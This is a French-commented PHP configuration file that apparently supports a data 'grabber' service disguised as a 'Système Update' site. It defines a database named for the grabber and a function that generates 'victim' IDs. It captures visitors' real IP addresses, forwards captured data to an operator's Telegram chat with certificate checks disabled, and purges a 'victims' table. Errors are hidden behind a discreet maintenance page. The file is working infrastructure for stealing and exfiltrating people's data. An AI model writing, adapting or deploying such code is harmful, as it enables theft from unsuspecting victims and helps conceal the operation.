<?php
/**
 * Configuration sécurisée avec gestion d'erreurs
 */

// ============================================
// MODE DEBUG (à désactiver en production)
// ============================================
define('DEBUG_MODE', false);

if (DEBUG_MODE) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
}

// ============================================
// BASE DE DONNÉES
// ============================================
define('DB_HOST', 'sqlXXX.infinityfree.com');
define('DB_NAME', 'if0_xxxxxx_grabber');
define('DB_USER', 'if0_xxxxxx');
define('DB_PASS', 'votre_mdp');
define('DB_CHARSET', 'utf8mb4');

// ============================================
// SITE
// ============================================
define('SITE_URL', 'https://votre-site.infinityfreeapp.com');
define('SITE_NAME', 'Système Update');
define('ADMIN_PASSWORD', password_hash('Admin123!', PASSWORD_BCRYPT));

// ============================================
// CHEMINS (avec vérification)
// ============================================
define('ROOT_PATH', __DIR__);
define('DATA_PATH', ROOT_PATH . '/data/');
define('LOG_PATH', ROOT_PATH . '/logs/');

// Création automatique des dossiers
$dirs = [DATA_PATH, LOG_PATH];
foreach ($dirs as $dir) {
    if (!is_dir($dir)) {
        if (!mkdir($dir, 0755, true)) {
            die("Erreur: Impossible de créer le dossier $dir");
        }
    }
    // Protection .htaccess
    if (!file_exists($dir . '.htaccess')) {
        file_put_contents($dir . '.htaccess', "Deny from all");
    }
}

// ============================================
// TELEGRAM (optionnel)
// ============================================
define('TELEGRAM_TOKEN', ''); // Laissez vide si pas utilisé
define('TELEGRAM_CHAT_ID', '');

// ============================================
// CONNEXION BDD AVEC GESTION D'ERREURS
// ============================================
try {
    $pdo = new PDO(
        "mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=".DB_CHARSET,
        DB_USER,
        DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_TIMEOUT => 3
        ]
    );
} catch (PDOException $e) {
    // Log silencieux en production
    error_log("Database connection failed: " . $e->getMessage());
    
    if (DEBUG_MODE) {
        die("Erreur BDD: " . $e->getMessage());
    } else {
        // Page de maintenance discrète
        header('HTTP/1.1 503 Service Unavailable');
        die('Site temporairement indisponible');
    }
}

// ============================================
// FONCTIONS UTILES
// ============================================

/**
 * Génère un ID unique avec timestamp
 */
function generateVictimId() {
    return 'v_' . time() . '_' . bin2hex(random_bytes(4));
}

/**
 * Récupère l'IP réelle (gère les proxy)
 */
function getClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            return trim($ip);
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/**
 * Log avec rotation automatique
 */
function logActivity($message, $type = 'info') {
    $logFile = LOG_PATH . date('Y-m-d') . '.log';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] [$type] $message" . PHP_EOL;
    
    // Limite à 100MB par fichier
    if (file_exists($logFile) && filesize($logFile) > 100 * 1024 * 1024) {
        rename($logFile, LOG_PATH . date('Y-m-d_H-i-s') . '.log.old');
    }
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

/**
 * Envoi Telegram avec timeout
 */
function sendToTelegram($message) {
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return false;
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        logActivity("Telegram error: $error", 'error');
        return false;
    }
    
    return true;
}

/**
 * Nettoyage des anciennes données
 */
function cleanOldData($days = 30) {
    $cutoff = date('Y-m-d H:i:s', strtotime("-$days days"));
    
    try {
        global $pdo;
        $pdo->prepare("DELETE FROM victims WHERE last_seen < ?")->execute([$cutoff]);
        logActivity("Nettoyage: données antérieures à $cutoff supprimées");
    } catch (Exception $e) {
        logActivity("Erreur nettoyage: " . $e->getMessage(), 'error');
    }
}

// Nettoyage hebdomadaire (exécuté 1 fois sur 100)
if (rand(1, 100) === 1) {
    cleanOldData();
}
?>
